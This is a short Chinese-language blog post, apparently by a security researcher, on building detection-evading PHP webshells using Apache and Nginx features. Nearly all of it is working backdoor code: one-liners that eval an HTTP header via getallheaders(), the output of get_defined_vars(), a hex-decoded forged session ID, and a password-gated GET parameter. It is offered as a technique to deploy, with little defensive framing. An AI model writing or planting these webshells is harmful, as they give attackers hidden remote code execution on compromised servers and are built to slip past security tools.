---

title: "PHP利用Apache、Nginx的特性实现免杀Webshell"
date: 2019-01-25T21:20:47+08:00
draft: false
tags: ['apache','nginx','shell','bypass']
categories: ['bypass']
---

`get_defined_vars()`、`getallheaders()`是两个特性函数，我们可以通过这两个函数来构造我们的webshell。
前几天看到的，一直忘记写，填坑。
<!--more-->

|  环境  |         函数         |               用法               |
| :----: | :------------------: | :------------------------------: |
| nginx  | `get_defined_vars()` | 返回由所有已定义变量所组成的数组 |
| apache |  `getallheaders()`   |     获取全部 HTTP 请求头信息     |

## apache环境

```php
<?php
eval(next(getallheaders())); 
?>
```

![](https://y4er.com/img/uploads/20190509161475.jpg)

## apache和nginx环境通用

```php
<?php
eval(implode(reset(get_defined_vars())));
?>
```

![](https://y4er.com/img/uploads/20190509164784.jpg)
另外一种通过执行伪造的sessionid值，进行任意代码执行。

```php
<?php
eval(hex2bin(session_id(session_start())));
?>
```

![](https://y4er.com/img/uploads/20190509166713.jpg)

`706870696e666f28293b`这个是`phpinfo();`的hex编码。

## 给shell加密码

```php
<?php eval(get_defined_vars()['_GET']['cmd']);?>
```

